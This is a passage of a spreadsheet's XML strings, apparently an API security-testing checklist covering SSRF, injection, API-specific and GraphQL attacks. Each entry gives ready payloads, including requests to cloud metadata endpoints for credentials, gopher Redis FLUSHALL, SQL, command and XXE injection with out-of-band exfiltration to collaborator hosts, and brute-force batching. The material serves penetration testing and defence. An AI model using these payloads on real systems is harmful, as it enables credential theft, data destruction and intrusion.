    <t xml:space="preserve">Send huge arrays in body/SOAP/JSON when the parser allocates eagerly. Crashes parsers without max-array-length limits.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/bulk {"ids":[1,2,3,...,1000000]} | Generate with python -c "print(list(range(10**6)))"</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-001</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF (API7:2023)</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF in webhook configuration</t>
  </si>
  <si>
    <t xml:space="preserve">Set the webhook URL to internal services or cloud metadata endpoints. Webhook configuration is a classic SSRF sink because the application must fetch the URL server-side.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/webhooks {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP API Security Top 10 - API7:2023</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-002</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF in URL / import parameters</t>
  </si>
  <si>
    <t xml:space="preserve">Any URL parameter (url=, fetch=, import_url=, callback=, image_url=, link=) is a candidate. Common sinks: image preview, link unfurl, web-to-PDF, metadata fetcher, RSS importer.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/import {"url":"http://internal:8080/admin"} | GET /v1/proxy?url=file:///etc/passwd</t>
  </si>
  <si>
    <t xml:space="preserve">wiz.io/academy/application-security/server-side-request-forgery</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-003</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF in PDF / SVG / image generators</t>
  </si>
  <si>
    <t xml:space="preserve">Inject internal URLs or SSRF-payload-bearing markup into HTML-to-PDF, SVG renderers, or image-template engines. wkhtmltopdf, Puppeteer, and similar tools execute embedded fetches.</t>
  </si>
  <si>
    <t xml:space="preserve">Inject &lt;iframe src=http://169.254.169.254/...&gt; in HTML body | &lt;img src=http://internal/admin&gt; | &lt;object data=file:///etc/passwd&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">blog.assetnote.io - PDF SSRF</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-004</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF via redirect chains</t>
  </si>
  <si>
    <t xml:space="preserve">Set the target URL to attacker.com which 302-redirects to internal services. Tests whether the SSRF protection follows redirects without re-validating the destination.</t>
  </si>
  <si>
    <t xml:space="preserve">Attacker server: HTTP/1.1 302 Found / Location: http://169.254.169.254/ | Target fetches attacker.com</t>
  </si>
  <si>
    <t xml:space="preserve">PortSwigger - SSRF via redirect</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-005</t>
  </si>
  <si>
    <t xml:space="preserve">Blind SSRF detection via OOB callbacks</t>
  </si>
  <si>
    <t xml:space="preserve">When SSRF response isn't reflected, use Burp Collaborator or interactsh to detect outbound DNS/HTTP from the target. Then binary-search internal network via response-time differential.</t>
  </si>
  <si>
    <t xml:space="preserve">Collaborator URL in URL param | Time GET /internal/X for X in 192.168.0/24 to map live hosts</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/burp/documentation/collaborator</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-006</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF to AWS IMDSv1</t>
  </si>
  <si>
    <t xml:space="preserve">Fetch IAM credentials directly via IMDSv1 (no token required). Classic Capital One-style attack. Works on EC2/ECS instances where IMDSv1 isn't disabled.</t>
  </si>
  <si>
    <t xml:space="preserve">GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ | Then GET the role name endpoint</t>
  </si>
  <si>
    <t xml:space="preserve">f5.com/labs - EC2 IMDS campaigns</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-007</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF to AWS IMDSv2</t>
  </si>
  <si>
    <t xml:space="preserve">IMDSv2 requires a PUT to /latest/api/token then GET with X-aws-ec2-metadata-token header. Requires SSRF that supports PUT or header injection.</t>
  </si>
  <si>
    <t xml:space="preserve">PUT http://169.254.169.254/latest/api/token + X-aws-ec2-metadata-token-ttl-seconds: 21600 | GET with the returned token</t>
  </si>
  <si>
    <t xml:space="preserve">docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-IMDS-new-instances.html</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-008</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF to GCP metadata service</t>
  </si>
  <si>
    <t xml:space="preserve">GCP requires the Metadata-Flavor: Google header. Test whether the SSRF allows custom headers.</t>
  </si>
  <si>
    <t xml:space="preserve">GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token + Metadata-Flavor: Google</t>
  </si>
  <si>
    <t xml:space="preserve">cloud.google.com/compute/docs/metadata</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-009</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF to Azure IMDS</t>
  </si>
  <si>
    <t xml:space="preserve">Azure IMDS at 169.254.169.254 requires Metadata: true header. Returns managed identity tokens with full Azure RBAC scope.</t>
  </si>
  <si>
    <t xml:space="preserve">GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/ + Metadata: true</t>
  </si>
  <si>
    <t xml:space="preserve">learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-010</t>
  </si>
  <si>
    <t xml:space="preserve">DNS rebinding for SSRF</t>
  </si>
  <si>
    <t xml:space="preserve">Register a domain that resolves first to a public IP (passes validation), then on the second request resolves to an internal IP (the actual fetch). Bypasses TOCTOU SSRF defenses.</t>
  </si>
  <si>
    <t xml:space="preserve">Tools: rbndr.us, dnsrebinder.net, nccgroup/singularity | Set TTL=0, two A records, sequential delivery</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/nccgroup/singularity</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-011</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF via gopher / dict / file / ldap protocols</t>
  </si>
  <si>
    <t xml:space="preserve">Beyond HTTP, test gopher:// for arbitrary TCP packets (Redis, SMTP, internal services), file:// for LFI, ldap:// for LDAP queries.</t>
  </si>
  <si>
    <t xml:space="preserve">gopher://127.0.0.1:6379/_FLUSHALL | file:///etc/passwd | dict://internal:11211/stats | ldap://internal/cn=admin</t>
  </si>
  <si>
    <t xml:space="preserve">swisskyrepo.github.io - SSRF</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-012</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF filter bypass via parser differential</t>
  </si>
  <si>
    <t xml:space="preserve">When the validator and the HTTP client use different URL parsers, craft URLs that one accepts as safe and the other resolves to the internal target.</t>
  </si>
  <si>
    <t xml:space="preserve">http://safe.com#@internal.com/ | http://safe.com\@internal.com/ | http://internal.com\@safe.com/ | Some parsers treat # or \ differently</t>
  </si>
  <si>
    <t xml:space="preserve">blackhat.com - A New Era of SSRF</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-013</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF via API-gateway proxying</t>
  </si>
  <si>
    <t xml:space="preserve">Some API gateways forward to arbitrary upstreams based on path or header. Test whether you can manipulate the upstream selection.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /proxy/internal.target.com:8080/admin | Header X-Upstream: internal.target.com</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-014</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF to Kubernetes / Docker / etcd</t>
  </si>
  <si>
    <t xml:space="preserve">Internal orchestration APIs (kube-apiserver, kubelet, Docker socket via TCP, etcd) are accessible via SSRF. EKS pod-identity at 169.254.170.23.</t>
  </si>
  <si>
    <t xml:space="preserve">GET http://169.254.170.23/v1/credentials | GET http://kubelet:10250/pods | GET http://etcd:2379/v2/keys</t>
  </si>
  <si>
    <t xml:space="preserve">kubernetes.io/docs - API security</t>
  </si>
  <si>
    <t xml:space="preserve">API-07-015</t>
  </si>
  <si>
    <t xml:space="preserve">SSRF via decimal / octal / IPv6 encoding</t>
  </si>
  <si>
    <t xml:space="preserve">Encode internal IPs to bypass simple blocklists: 127.0.0.1 → 2130706433 (decimal), 017700000001 (octal), [::ffff:127.0.0.1] (IPv6-mapped).</t>
  </si>
  <si>
    <t xml:space="preserve">http://2130706433/ | http://017700000001/ | http://[::ffff:169.254.169.254]/ | http://0x7f000001/</t>
  </si>
  <si>
    <t xml:space="preserve">HackTricks - SSRF bypass</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-001</t>
  </si>
  <si>
    <t xml:space="preserve">Injection - Standard</t>
  </si>
  <si>
    <t xml:space="preserve">Boolean-based blind SQLi</t>
  </si>
  <si>
    <t xml:space="preserve">Inject SQL that produces a different response for true vs false conditions. Iterate to extract data character-by-character.</t>
  </si>
  <si>
    <t xml:space="preserve">' AND 1=1-- | ' AND 1=2-- | ' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a'--</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/sql-injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-002</t>
  </si>
  <si>
    <t xml:space="preserve">Time-based blind SQLi</t>
  </si>
  <si>
    <t xml:space="preserve">Inject SQL that causes a measurable time delay when the condition is true. Works for any input, including GraphQL variables.</t>
  </si>
  <si>
    <t xml:space="preserve">'; WAITFOR DELAY '0:0:5'-- (MSSQL) | ' OR SLEEP(5)-- (MySQL) | '; SELECT pg_sleep(5)-- (PostgreSQL)</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/sql-injection/blind</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-003</t>
  </si>
  <si>
    <t xml:space="preserve">Error-based SQLi</t>
  </si>
  <si>
    <t xml:space="preserve">Trigger verbose database errors that leak data via the error message (extractvalue, UpdateXML, exp() overflow).</t>
  </si>
  <si>
    <t xml:space="preserve">' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- | ' AND UpdateXML(1,concat(0x7e,(SELECT version())),1)--</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-004</t>
  </si>
  <si>
    <t xml:space="preserve">Out-of-band SQLi</t>
  </si>
  <si>
    <t xml:space="preserve">Exfiltrate data via DNS or HTTP callbacks when in-band response is suppressed.</t>
  </si>
  <si>
    <t xml:space="preserve">'; exec xp_dirtree '\\&lt;collaborator&gt;\test'-- (MSSQL) | SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.&lt;collab&gt;')) (MySQL UDF)</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-005</t>
  </si>
  <si>
    <t xml:space="preserve">NoSQL operator injection - auth bypass</t>
  </si>
  <si>
    <t xml:space="preserve">Inject MongoDB query operators to bypass auth. {"$ne":""} matches any non-empty value; {"$gt":""} matches any string.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /login {"username":"admin","password":{"$ne":""}} | {"username":{"$regex":".*"},"password":{"$regex":".*"}}</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/Injection_Flaws</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-006</t>
  </si>
  <si>
    <t xml:space="preserve">NoSQL $where JS injection</t>
  </si>
  <si>
    <t xml:space="preserve">MongoDB's $where evaluates JavaScript. Use for blind extraction or DoS via long sleeps.</t>
  </si>
  <si>
    <t xml:space="preserve">{"$where":"sleep(5000) || true"} | {"$where":"this.password.match(/^a/)"}</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-007</t>
  </si>
  <si>
    <t xml:space="preserve">CouchDB / Redis injection</t>
  </si>
  <si>
    <t xml:space="preserve">CouchDB default-access abuse, CRLF injection into Redis protocol via SSRF, MongoDB raw protocol injection.</t>
  </si>
  <si>
    <t xml:space="preserve">Redis via SSRF gopher: gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20foo%20bar%0d%0a</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/jhddns/awesome-nosql-injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-008</t>
  </si>
  <si>
    <t xml:space="preserve">OS command injection</t>
  </si>
  <si>
    <t xml:space="preserve">Inject shell metacharacters into parameters passed to shell commands. Test all path, filename, and processing-related parameters.</t>
  </si>
  <si>
    <t xml:space="preserve">;id | |whoami | $(curl &lt;collab&gt;) | `id` | %0aid | newline injection bypasses some filters</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/os-command-injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-009</t>
  </si>
  <si>
    <t xml:space="preserve">LDAP injection</t>
  </si>
  <si>
    <t xml:space="preserve">Inject LDAP filter syntax into search parameters. Auth bypass via filter manipulation.</t>
  </si>
  <si>
    <t xml:space="preserve">*)(uid=* | *)(|(uid=*) | admin)(&amp;(password=*) | *))%00</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/attacks/LDAP_Injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-010</t>
  </si>
  <si>
    <t xml:space="preserve">XPath injection</t>
  </si>
  <si>
    <t xml:space="preserve">Inject XPath operators in XML-backed query params. Auth bypass and data extraction analogous to SQLi.</t>
  </si>
  <si>
    <t xml:space="preserve">' or '1'='1 | x' or name()='username' or 'x'='y | x']|//user/*|//*[</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/attacks/XPATH_Injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-011</t>
  </si>
  <si>
    <t xml:space="preserve">XXE in XML body</t>
  </si>
  <si>
    <t xml:space="preserve">Inject external entity in XML payloads. File read, SSRF, and (in some parsers) RCE via gopher.</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; | OOB: SYSTEM "http://&lt;collab&gt;/?d=%file;"</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-012</t>
  </si>
  <si>
    <t xml:space="preserve">Server-side template injection (SSTI)</t>
  </si>
  <si>
    <t xml:space="preserve">Inject template syntax into params that get rendered. Detect with engine-specific math expressions, then escalate to RCE.</t>
  </si>
  <si>
    <t xml:space="preserve">{{7*7}} (Jinja/Twig=49) | ${7*7} (Freemarker=49) | #{7*7} (Ruby) | &lt;%= 7*7 %&gt; (ERB) | Escalate to RCE per engine</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/server-side-template-injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-013</t>
  </si>
  <si>
    <t xml:space="preserve">Spring SpEL / OGNL injection</t>
  </si>
  <si>
    <t xml:space="preserve">Java expression-language injection in Spring SpEL and Struts OGNL. RCE via runtime exec.</t>
  </si>
  <si>
    <t xml:space="preserve">${T(java.lang.Runtime).getRuntime().exec('id')} | %{(#a=@java.lang.Runtime@getRuntime()).(#a.exec('id'))}</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-014</t>
  </si>
  <si>
    <t xml:space="preserve">Host header injection</t>
  </si>
  <si>
    <t xml:space="preserve">Manipulate the Host or X-Forwarded-Host header to poison password-reset links, cache keys, or internal routing.</t>
  </si>
  <si>
    <t xml:space="preserve">Host: attacker.com | X-Forwarded-Host: attacker.com | Look for the value reflected in password-reset emails</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/host-header</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-015</t>
  </si>
  <si>
    <t xml:space="preserve">CRLF / response splitting</t>
  </si>
  <si>
    <t xml:space="preserve">Inject %0d%0a into headers or response-influencing params to inject headers or split the response.</t>
  </si>
  <si>
    <t xml:space="preserve">param=foo%0d%0aSet-Cookie:admin=true | param=foo%0d%0a%0d%0a&lt;html&gt;injected&lt;/html&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/vulnerabilities/CRLF_Injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-016</t>
  </si>
  <si>
    <t xml:space="preserve">Log injection / log forging</t>
  </si>
  <si>
    <t xml:space="preserve">Newline injection in logged inputs (User-Agent, body fields) to forge fake log entries and confuse audit trails.</t>
  </si>
  <si>
    <t xml:space="preserve">User-Agent: foo%0d%0a2025-01-01 ADMIN: success | username=admin\n[INFO] login_success</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/attacks/Log_Injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-08-017</t>
  </si>
  <si>
    <t xml:space="preserve">ORM operator injection</t>
  </si>
  <si>
    <t xml:space="preserve">Manipulate ORM-specific filter operators (Django ORM __gt, __isnull, Sequelize Op.like) when query params are passed directly.</t>
  </si>
  <si>
    <t xml:space="preserve">?email__contains=@target | ?role__in=admin,user | Sequelize: ?id[Op.gt]=0</t>
  </si>
  <si>
    <t xml:space="preserve">OWASP - Injection variations</t>
  </si>
  <si>
    <t xml:space="preserve">API-09-001</t>
  </si>
  <si>
    <t xml:space="preserve">Injection - API-specific</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL argument / variable injection</t>
  </si>
  <si>
    <t xml:space="preserve">Pass injection payloads through GraphQL variables and arguments. The resolver may pass these to SQL/NoSQL/exec calls without parameterization.</t>
  </si>
  <si>
    <t xml:space="preserve">query { user(id: "1' OR 1=1--") } | mutation { search(q: $payload) } with $payload SQLi</t>
  </si>
  <si>
    <t xml:space="preserve">escape.tech - GraphQL injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-09-002</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL directive overloading</t>
  </si>
  <si>
    <t xml:space="preserve">Repeated @skip / @include directives confuse the parser's cost or complexity calculation. Some engines crash on parse.</t>
  </si>
  <si>
    <t xml:space="preserve">query { user @skip(if:true) @include(if:false) @skip(if:true) ... @skip(if:true) { name } }</t>
  </si>
  <si>
    <t xml:space="preserve">API-09-003</t>
  </si>
  <si>
    <t xml:space="preserve">gRPC protobuf payload injection</t>
  </si>
  <si>
    <t xml:space="preserve">Craft malformed protobuf messages: oversized bytes fields, negative ints (underflow), repeated fields beyond limits, unknown fields.</t>
  </si>
  <si>
    <t xml:space="preserve">Tool: protoscope to encode/decode | Set bytes field to 10MB | Negative int in size field | Recursive groups</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/protocolbuffers/protoscope</t>
  </si>
  <si>
    <t xml:space="preserve">API-09-004</t>
  </si>
  <si>
    <t xml:space="preserve">SOAP injection</t>
  </si>
  <si>
    <t xml:space="preserve">Inject additional SOAP elements into the body. The application's XML parser concatenates the extra elements, often modifying business logic.</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;username&gt;admin&lt;/username&gt;&lt;role&gt;admin&lt;/role&gt; | &lt;user&gt;foo&lt;/user&gt;&lt;user&gt;admin&lt;/user&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org - SOAP injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-09-005</t>
  </si>
  <si>
    <t xml:space="preserve">XML injection via CDATA breakout</t>
  </si>
  <si>
    <t xml:space="preserve">Break out of &lt;![CDATA[ ]]&gt; sections by injecting ]]&gt; to escape user-supplied content into the XML structure.</t>
  </si>
  <si>
    <t xml:space="preserve">input: foo]]&gt;&lt;injected&gt;true&lt;/injected&gt;&lt;![CDATA[ | becomes: &lt;![CDATA[foo]]&gt;&lt;injected&gt;true&lt;/injected&gt;&lt;![CDATA[]]&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/vulnerabilities/XML_Injection</t>
  </si>
  <si>
    <t xml:space="preserve">API-09-006</t>
  </si>
  <si>
    <t xml:space="preserve">JSON injection / duplicate-key confusion</t>
  </si>
  <si>
    <t xml:space="preserve">Send JSON with duplicate keys, BOM bytes, NaN, or control characters. Parsers differ on which value wins, leading to validation/processing mismatches.</t>
  </si>
  <si>
    <t xml:space="preserve">{"role":"user","role":"admin"} | {"amount":100,"amount":-100} | Test last-wins vs first-wins</t>
  </si>
  <si>
    <t xml:space="preserve">bishopfox.com/blog/json-interoperability-vulnerabilities</t>
  </si>
  <si>
    <t xml:space="preserve">API-09-007</t>
  </si>
  <si>
    <t xml:space="preserve">Batch endpoint abuse</t>
  </si>
  <si>
    <t xml:space="preserve">Submit an array of operations in a single request to bypass per-request controls (rate limit, idempotency, transaction integrity).</t>
  </si>
  <si>
    <t xml:space="preserve">POST /batch [{"op":"transfer","amount":100},...x100] | Distribute high-impact ops to evade rate limit</t>
  </si>
  <si>
    <t xml:space="preserve">API-09-008</t>
  </si>
  <si>
    <t xml:space="preserve">HTTP parameter pollution (HPP)</t>
  </si>
  <si>
    <t xml:space="preserve">Submit the same parameter multiple times. Different layers (proxy, framework, application) may pick different values, enabling auth bypass or business-logic abuse.</t>
  </si>
  <si>
    <t xml:space="preserve">?role=user&amp;role=admin | POST body role=user&amp;role=admin | Test last-wins vs first-wins per layer</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org/www-community/attacks/HTTP_Parameter_Pollution</t>
  </si>
  <si>
    <t xml:space="preserve">API-09-009</t>
  </si>
  <si>
    <t xml:space="preserve">JSONP callback injection</t>
  </si>
  <si>
    <t xml:space="preserve">Inject JavaScript via the callback parameter on legacy JSONP endpoints. Reflected XSS against any same-origin context that includes the script.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /v1/data?callback=alert(1)// | callback=&lt;script&gt;...&lt;/script&gt;</t>
  </si>
  <si>
    <t xml:space="preserve">owasp.org - JSONP</t>
  </si>
  <si>
    <t xml:space="preserve">API-09-010</t>
  </si>
  <si>
    <t xml:space="preserve">Content-type confusion</t>
  </si>
  <si>
    <t xml:space="preserve">Send unexpected content-types (text/plain, x-www-form-urlencoded) to API endpoints expecting JSON to bypass CSRF protection or trigger different parsing paths.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /v1/transfer Content-Type: text/plain Body: {"to":"attacker"} | Some servers parse text/plain as JSON</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/csrf/bypassing-token-validation</t>
  </si>
  <si>
    <t xml:space="preserve">API-09-011</t>
  </si>
  <si>
    <t xml:space="preserve">OData injection</t>
  </si>
  <si>
    <t xml:space="preserve">Manipulate $filter, $expand, $select, and $orderby OData query options to access unauthorized properties or trigger expensive joins.</t>
  </si>
  <si>
    <t xml:space="preserve">?$filter=role eq 'admin' | ?$expand=internalNotes | ?$select=password_hash | ?$orderby=password_hash desc</t>
  </si>
  <si>
    <t xml:space="preserve">OData specification</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-001</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL-specific</t>
  </si>
  <si>
    <t xml:space="preserve">Introspection enabled in production</t>
  </si>
  <si>
    <t xml:space="preserve">Production GraphQL endpoints should have introspection disabled. When enabled, attackers download the full schema for attack planning.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /graphql {"query":"{__schema{types{name,fields{name,type{name,kind}}}}}"} | InQL Burp extension</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-002</t>
  </si>
  <si>
    <t xml:space="preserve">Introspection regex bypass via whitespace</t>
  </si>
  <si>
    <t xml:space="preserve">WAF regexes often match __schema literally. Insert newlines, tabs, or comments — GraphQL ignores whitespace, but the regex won't match.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /graphql {"query":"query{\n__sch\nema{types{name}}}"} | {"query":"{__schema #comment\n{types{name}}}"}</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-003</t>
  </si>
  <si>
    <t xml:space="preserve">Introspection via GET / alternate method</t>
  </si>
  <si>
    <t xml:space="preserve">If POST is blocked, try GET with query in URL params, or different content-types (application/x-www-form-urlencoded).</t>
  </si>
  <si>
    <t xml:space="preserve">GET /graphql?query={__schema{types{name}}} | POST with Content-Type: application/x-www-form-urlencoded query=...</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-004</t>
  </si>
  <si>
    <t xml:space="preserve">Array-batching brute force</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL endpoints often accept an array of queries in a single HTTP request. Distribute brute-force attempts across batched queries to evade per-request rate limiting.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /graphql [{query:'mutation{login(...)}'},{query:'mutation{login(...)}'},...] | Tool: BatchQL</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/dolevf/graphql-cop</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-005</t>
  </si>
  <si>
    <t xml:space="preserve">Alias-based credential / OTP brute force</t>
  </si>
  <si>
    <t xml:space="preserve">Use GraphQL aliases to send many login attempts in a single operation. Bypasses standard rate limiters which count HTTP requests.</t>
  </si>
  <si>
    <t xml:space="preserve">mutation { a1:login(user:"x",pass:"1") {token} a2:login(user:"x",pass:"2") {token} ... a999:login(...) }</t>
  </si>
  <si>
    <t xml:space="preserve">lab.wallarm.com/graphql-batching-attack</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-006</t>
  </si>
  <si>
    <t xml:space="preserve">Suggestion-list disclosure (Did you mean...?)</t>
  </si>
  <si>
    <t xml:space="preserve">Apollo and others suggest field names on parse error. Iterate alphabetic prefixes to extract every field name even with introspection disabled. Mitigate via hideSchemaDetailsFromClientErrors or blockFieldSuggestions.</t>
  </si>
  <si>
    <t xml:space="preserve">Submit query referencing non-existent fields | Read 'Did you mean "&lt;field&gt;"?' suggestions | Clairvoyance automates this</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-007</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL CSRF over GET / form-encoded</t>
  </si>
  <si>
    <t xml:space="preserve">State-changing mutations should reject GET and form-encoded requests. If accepted, classic CSRF works since cookie auth + no CSRF token = exploitable.</t>
  </si>
  <si>
    <t xml:space="preserve">GET /graphql?query=mutation{deleteAccount} | POST Content-Type: application/x-www-form-urlencoded query=mutation{...}</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-008</t>
  </si>
  <si>
    <t xml:space="preserve">Field / resolver-level authorization bypass</t>
  </si>
  <si>
    <t xml:space="preserve">User is authorized to query the User type, but sensitive fields (email, internal_notes, ssn) are not properly access-controlled at resolver level.</t>
  </si>
  <si>
    <t xml:space="preserve">query { user(id: &lt;self&gt;) { email phone ssn internal_notes admin_only_field } }</t>
  </si>
  <si>
    <t xml:space="preserve">escape.tech - GraphQL authorization</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-009</t>
  </si>
  <si>
    <t xml:space="preserve">Persisted-query bypass</t>
  </si>
  <si>
    <t xml:space="preserve">If the server normally requires persisted query IDs, test whether it falls back to accepting full queries when an unknown ID is sent or persistedQuery extension is omitted.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /graphql {"query":"&lt;full query&gt;","extensions":{"persistedQuery":{"sha256Hash":"&lt;unknown&gt;"}}}</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/apollographql/apollo-server</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-010</t>
  </si>
  <si>
    <t xml:space="preserve">Subscription auth bypass / CSWSH</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL subscriptions over WebSocket frequently skip per-message auth, only checking the connection handshake. Test for cross-site WS hijacking.</t>
  </si>
  <si>
    <t xml:space="preserve">Connect to wss://api/graphql with subscribe message | Read sensitive subscription topics</t>
  </si>
  <si>
    <t xml:space="preserve">portswigger.net/web-security/websockets/cross-site-websocket-hijacking</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-011</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL error-message leakage</t>
  </si>
  <si>
    <t xml:space="preserve">Verbose resolver errors leak file paths, SQL queries, stack traces, and database schema. Often more verbose than REST errors.</t>
  </si>
  <si>
    <t xml:space="preserve">Trigger errors: invalid type, missing required, malformed args | Read response 'errors' field for paths/SQL</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-012</t>
  </si>
  <si>
    <t xml:space="preserve">Custom directive abuse</t>
  </si>
  <si>
    <t xml:space="preserve">Server-defined directives may bypass auth or modify behavior in unexpected ways. Enumerate custom directives via introspection.</t>
  </si>
  <si>
    <t xml:space="preserve">query { sensitiveData @insecure } | mutation { adminAction @raw } | Discover via __schema.directives</t>
  </si>
  <si>
    <t xml:space="preserve">escape.tech - GraphQL directives</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-013</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL multipart file-upload abuse</t>
  </si>
  <si>
    <t xml:space="preserve">The graphql-upload spec allows file uploads via multipart. Test for SSRF in file URLs, path traversal in filenames, and unrestricted upload types.</t>
  </si>
  <si>
    <t xml:space="preserve">POST /graphql multipart/form-data with operations + map + files | Filename: ../../etc/passwd | URL field: http://internal</t>
  </si>
  <si>
    <t xml:space="preserve">github.com/jaydenseric/graphql-multipart-request-spec</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-014</t>
  </si>
  <si>
    <t xml:space="preserve">GraphQL type confusion in variables</t>
  </si>
  <si>
    <t xml:space="preserve">Pass an array where a scalar is expected, or a string where an int is expected. Type coercion bugs can bypass validation.</t>
  </si>
  <si>
    <t xml:space="preserve">Schema expects ID!: pass ["id1","id2"] | Schema expects Int: pass "99999999999999" (overflow)</t>
  </si>
  <si>
    <t xml:space="preserve">escape.tech - GraphQL type confusion</t>
  </si>
  <si>
    <t xml:space="preserve">API-10-015</t>
  </si>
  <si>
    <t xml:space="preserve">__type targeted enumeration</t>
  </si>
  <si>
    <t xml:space="preserve">When full __schema introspection is blocked, try targeted __type queries to enumerate specific types one at a time — often still allowed.</t>
  </si>
  <si>
